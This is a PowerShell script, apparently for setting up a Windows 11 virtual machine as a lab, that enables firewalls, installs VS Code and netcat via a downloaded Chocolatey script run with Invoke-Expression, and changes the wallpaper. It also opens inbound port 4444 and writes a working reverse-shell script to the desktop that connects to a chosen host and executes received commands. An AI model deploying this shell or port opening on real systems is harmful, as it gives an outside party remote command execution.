# This script is intended to run on Windows 11 Pro that has just been setup. Probably as a virtual machine. The user should be an administrator and powershell should be executed as Admin (Win-R, Powershell, CTRL-SHIFT-ENTER)
# Make sure you set the execution policy e.g. Set-ExecutionPolicy RemoteSigned -Scope CurrentUser. Run this script as an administrator ()
# Enable all firewalls and permit internal inbound and outbound traffic
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled True
Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv6-In)" -Enabled True
New-NetFirewallRule -DisplayName "Open Port 4444" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow

# Places a PowerShell shortcut on desktop
$ShortcutPath = [Environment]::GetFolderPath("Desktop") + "\PowerShell.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Save()

# Downloads and installs MS Visual Code and then adds the PowerShell extension
$ChocoInstallScript = Invoke-WebRequest "https://chocolatey.org/install.ps1" -UseBasicParsing
Invoke-Expression ($ChocoInstallScript.Content)
choco install -y vscode, netcat

# Wait for VSCode to be installed
$VSCodePath = "$env:ProgramFiles\Microsoft VS Code\bin\code.cmd"
$MaxWaitTime = 300
$WaitInterval = 5
$TimeElapsed = 0
while (-not (Test-Path $VSCodePath) -and $TimeElapsed -lt $MaxWaitTime) {
    Start-Sleep -Seconds $WaitInterval
    $TimeElapsed += $WaitInterval
}

if (Test-Path $VSCodePath) {
    Start-Process -FilePath $VSCodePath -ArgumentList "--install-extension", "ms-vscode.powershell" -Wait -NoNewWindow
} else {
    Write-Warning "VSCode installation took longer than expected. Please install the PowerShell extension manually."
}

# Change the desktop background to solid blue, the hard way...
$SolidColorPath = "HKCU:\Control Panel\Colors"
function Set-SolidColorBackground($r, $g, $b) {
    $SPI_SETDESKWALLPAPER = 0x0014
    $SPIF_UPDATEINIFILE = 0x01
    $SPIF_SENDCHANGE = 0x02

    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;

        public class Wallpaper {
            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
"@
    $color = "$r $g $b"
    Set-ItemProperty -Path $SolidColorPath -Name "Background" -Value $color
    [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, " ", $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
}

Set-SolidColorBackground -r 0 -g 0 -b 255

# Check the desktop to see if the file exists, if yes then asks for new file name then moves on to create the file, if not then it creates the file that will be needed for the reverse shell.

$desktopPath = [Environment]::GetFolderPath("Desktop")
$reverseShellFilePath = Join-Path -Path $desktopPath -ChildPath "ReversePShell.ps1"

if (-not (Test-Path -Path $reverseShellFilePath)) {
    $reverseShellScript = @"
function Execute-Command {
    param(
        [Parameter(Mandatory = `$true)]
        [string]`$CommandText
    )
    `$Output = (Invoke-Expression -Command `$CommandText -ErrorAction SilentlyContinue |
               Out-String).Trim()
    return `$Output
}

Write-Host "Enter the host's IP address:"
`$ip = Read-Host
Write-Host "Enter the host's port:"
`$port = Read-Host

`$socket = New-Object System.Net.Sockets.TcpClient(`$ip, `$port)

if (`$socket -eq `$null) {
    exit 1
}

`$stream = `$socket.GetStream()
`$writer = New-Object System.IO.StreamWriter(`$stream)
`$buffer = New-Object System.Byte[] 1024
`$encoding = New-Object System.Text.AsciiEncoding

do {
    `$writer.Write("> ")
    `$writer.Flush()

    `$read = `$null
    while (-not `$stream.DataAvailable -or (`$read = `$stream.Read(`$buffer, 0, 1024)) -eq `$null) { }
    `$input = `$encoding.GetString(`$buffer, 0, `$read).Replace("`r`n", "").Replace("`n", "")

    if (-not `$input.Equals("exit")) {
        `$output = Execute-Command -CommandText `$input
        if (`$output -ne `$null) {
            `$writer.WriteLine(`$output)
        }
    }
} while (-not `$input.Equals("exit"))

`$writer.Close()
`$socket.Close()
"@

    Set-Content -Path $reverseShellFilePath -Value $reverseShellScript
}

# Restart the system in case there is anything added by the script that needs a reboot
$global:ScriptHasRunPath = Join-Path ([System.IO.Path]::GetTempPath()) "ScriptHasRun.txt"

if (-not (Test-Path $global:ScriptHasRunPath)) {
    # Create a file to indicate the script has run once
    New-Item -ItemType File -Path $global:ScriptHasRunPath -Force | Out-Null

    # Restart the system
    Restart-Computer -Force
} else {
    # Remove the temporary file
    Remove-Item -Path $global:ScriptHasRunPath -Force
}
